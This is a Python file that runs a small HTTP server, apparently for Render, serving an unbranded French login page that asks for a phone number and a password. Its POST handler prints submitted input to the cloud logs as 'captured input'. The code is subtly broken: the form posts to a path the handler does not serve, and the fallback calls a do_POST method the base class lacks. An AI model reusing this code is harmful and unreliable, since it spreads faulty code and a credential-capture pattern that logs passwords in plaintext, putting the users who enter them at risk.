import http.server
import socketserver
import json
import os

# Render choisit son port via cette variable d'environnement
PORT = int(os.environ.get("PORT", 8080))

PAGE_HTML = """
 <!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }
        h2 {
            margin-bottom: 20px;
            color: #333333;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #666666;
            font-weight: bold;
        }
        input[type="tel"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }
        input:focus {
            border-color: #007bff;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Se connecter</h2>
    <form action="/ma-page-de-traitement" method="POST">
        
        <div class="form-group">
            <label id="label-tel" for="phone">Numéro de téléphone :</label>
            <input 
                type="tel" 
                id="phone" 
                name="phone" 
                placeholder="Ex : 0612345678" 
                pattern="[0-9]{8,15}" 
                title="Veuillez entrer un numéro de téléphone valide (uniquement des chiffres, entre 8 et 15 caractères)." 
                required>
        </div>

        <div class="form-group">
            <label id="label-pass" for="password">Mot de passe :</label>
            <input 
                type="password" 
                id="password" 
                name="password" 
                placeholder="Votre mot de passe" 
                required>
        </div>

        <button type="submit">Connexion</button>
        
    </form>
</div>

</body>
</html>
"""

class CloudHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(PAGE_HTML.encode('utf-8'))

    def do_POST(self):
        if self.path == '/api/message':
            taille = int(self.headers['Content-Length'])
            corps_brut = self.rfile.read(taille).decode('utf-8')
            donnees_recues = json.loads(corps_brut)
            texte_final = donnees_recues.get('message_utilisateur', '')
            
            # Ce message s'affichera dans les "Logs" de Render
            print(f"[LOG CLOUD] Saisie capturée : {texte_final}")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            
            reponse_json = {"status": f"✓ Enregistré dans le Cloud : \"{texte_final}\""}
            self.wfile.write(json.dumps(reponse_json).encode('utf-8'))
        else:
            super().do_POST()

with socketserver.TCPServer(("", PORT), CloudHandler) as httpd:
    print(f"Serveur actif sur le port {PORT}")
    httpd.serve_forever()
